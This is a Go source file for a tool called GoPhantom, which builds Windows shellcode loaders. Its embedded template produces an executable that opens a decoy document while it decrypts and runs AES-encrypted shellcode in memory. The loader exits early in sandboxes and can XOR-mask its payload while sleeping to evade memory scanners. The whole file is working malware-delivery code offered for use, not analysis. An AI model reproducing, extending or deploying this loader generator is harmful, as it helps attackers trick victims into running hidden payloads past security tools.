package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"gofilepacker/internal/keymgr"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

const logo = `
   ___        ___ _                 _                  
  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___  
 / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \ 
/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|

          >> Advanced Payload Loader Generator <<
                                           by hsad
`

const loaderTemplate = `
//go:build windows
// +build windows

// 由 GoPhantom 生成的最终加载器
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"golang.org/x/crypto/argon2"
	"golang.org/x/sys/windows"
	"os"
	"path/filepath"
	"runtime"
	"time"
	"unsafe"
)

// 这些常量由生成器在编译时动态注入。
const (
	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
	aesSaltBase64            = "{{.Salt}}"
	decoyFileName            = "{{.DecoyFileName}}"
)

// decryptAESGCM 使用通过 Argon2id 从 Salt 派生出的 AES 密钥来解密 Base64 编码的数据。
func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
	if err != nil { return nil, fmt.Errorf("salt decoding failed: %v", err) }

    const (
        argon2Time = 1; argon2Memory = 64 * 1024; argon2Threads = 4; keyLength = 32
    )
    var argon2Password = []byte("gophantom-static-secret-for-derivation")

	key := argon2.IDKey(argon2Password, salt, argon2Time, argon2Memory, argon2Threads, keyLength)

	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
	if err != nil { return nil, fmt.Errorf("ciphertext decoding failed: %v", err) }

	block, err := aes.NewCipher(key)
	if err != nil { return nil, fmt.Errorf("failed to create new cipher: %v", err) }

	gcm, err := cipher.NewGCM(block)
	if err != nil { return nil, fmt.Errorf("failed to create new GCM: %v", err) }

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize { return nil, fmt.Errorf("ciphertext is too short") }

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// antiSandboxChecks 执行基本的反沙箱环境检查。
func antiSandboxChecks() {
	if runtime.NumCPU() < 2 { os.Exit(0) }

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
	
	type memoryStatusEx struct {
		Length uint32; MemoryLoad uint32; TotalPhys uint64; AvailPhys uint64; TotalPageFile uint64
		AvailPageFile uint64; TotalVirtual uint64; AvailVirtual uint64; AvailExtendedVirtual uint64
	}

	var memStatex memoryStatusEx
	memStatex.Length = uint32(unsafe.Sizeof(memStatex))
	
	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatex)))
	if ret != 0 {
		if memStatex.TotalPhys/1024/1024/1024 < 4 { os.Exit(0) }
	}
}

// sleepObfuscate 在睡眠期间对内存中的 shellcode 进行 XOR 加密/解密，以规避内存扫描。
func sleepObfuscate(address uintptr, size uintptr) {
	key := make([]byte, 8)
	_, err := rand.Read(key)
	if err != nil {
		time.Sleep(5 * time.Second)
		return
	}

	mem := (*[1 << 30]byte)(unsafe.Pointer(address))[:size:size]

	// 加密
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%8]
	}

	time.Sleep(5 * time.Second)

	// 解密
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%8]
	}
}


// executeShellcode 分配内存 (RW)，写入 shellcode，进行可选的睡眠混淆，
// 修改内存保护为 (RX)，最后创建线程执行。
func executeShellcode(shellcode []byte, obfuscate bool) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	virtualProtect := kernel32.NewProc("VirtualProtect")
	createThread := kernel32.NewProc("CreateThread")

	// 1. 以 PAGE_READWRITE 权限申请内存
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		return
	}

	// 2. 将 shellcode 复制到新分配的内存中
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
	copy(dst, shellcode)
	
	// 3. (可选) 执行睡眠混淆
	if obfuscate {
		sleepObfuscate(addr, uintptr(len(shellcode)))
	}

	// 4. 将内存页权限从 RW 修改为 RX (PAGE_EXECUTE_READ)
	var oldProtect uint32
	_, _, errVirtualProtect := virtualProtect.Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
    if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		return
	}
	
	// 5. 创建新线程来执行 shellcode
	createThread.Call(0, 0, addr, 0, 0, 0)
}

func main() {
	antiSandboxChecks()

	decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesSaltBase64)
	if err == nil {
		decoyPath := filepath.Join(os.Getenv("PUBLIC"), decoyFileName)
		_ = os.WriteFile(decoyPath, decoyBytes, 0644)
		
		verb, _ := windows.UTF16PtrFromString("open")
		path, _ := windows.UTF16PtrFromString(decoyPath)
		windows.ShellExecute(0, verb, path, nil, nil, windows.SW_SHOWNORMAL)
	}
	
	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64)
	if err == nil {
		// 检查环境变量以决定是否启用睡眠混淆
		obfuscate := os.Getenv("GPH_OBFUS") == "1"
		executeShellcode(shellcode, obfuscate)
	}

	time.Sleep(3 * time.Second)
}
`

type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Salt             string
	DecoyFileName    string
}

func encryptAESGCM(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func main() {
	log.SetFlags(0)
	log.Println(logo)

	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	outputFile := flag.String("out", "FinalLoader.exe", "Optional: Final output executable name.")
	flag.Parse()

	if *decoyFile == "" || *payloadFile == "" {
		log.Println("\nError: Both -decoy and -payload flags are required.")
		log.Println("Usage:")
		flag.PrintDefaults()
		os.Exit(1)
	}

	decoyBytes, err := os.ReadFile(*decoyFile)
	if err != nil {
		log.Fatalf("[-] Failed to read decoy file: %v", err)
	}
	shellcodeBytes, err := os.ReadFile(*payloadFile)
	if err != nil {
		log.Fatalf("[-] Failed to read payload file: %v", err)
	}

	log.Println("[+] Deriving AES-256 key using Argon2id...")
	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
	if err != nil {
		log.Fatalf("[-] Failed to derive key and salt: %v", err)
	}

	log.Println("[+] Encrypting decoy file with derived key...")
	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
	}

	log.Println("[+] Encrypting payload file with the same derived key...")
	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
	}

	data := TemplateData{
		EncryptedPayload: encryptedShellcode,
		EncryptedDecoy:   encryptedDecoy,
		Salt:             base64.StdEncoding.EncodeToString(salt),
		DecoyFileName:    filepath.Base(*decoyFile),
	}

	log.Println("[+] Generating loader source code...")
	tmpl, err := template.New("loader").Parse(loaderTemplate)
	if err != nil {
		log.Fatalf("[-] Failed to parse loader template: %v", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		log.Fatalf("[-] Failed to execute template: %v", err)
	}

	tmpfile, err := os.CreateTemp("", "loader-*.go")
	if err != nil {
		log.Fatalf("[-] Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write(sourceCode.Bytes()); err != nil {
		log.Fatalf("[-] Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("[-] Failed to close temp file: %v", err)
	}

	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
	// NEW: Added log message about the new feature.
	log.Println("[+] Evasion feature 'Sleep-Obfuscation' included. (Activate on target with env: GPH_OBFUS=1)")

	ldflags := "-s -w -H windowsgui"
	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", ldflags, tmpfile.Name())
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("[-] Compilation failed:\n%s", string(output))
	}

	log.Printf("\n[✓] Successfully generated loader: %s\n", *outputFile)
}
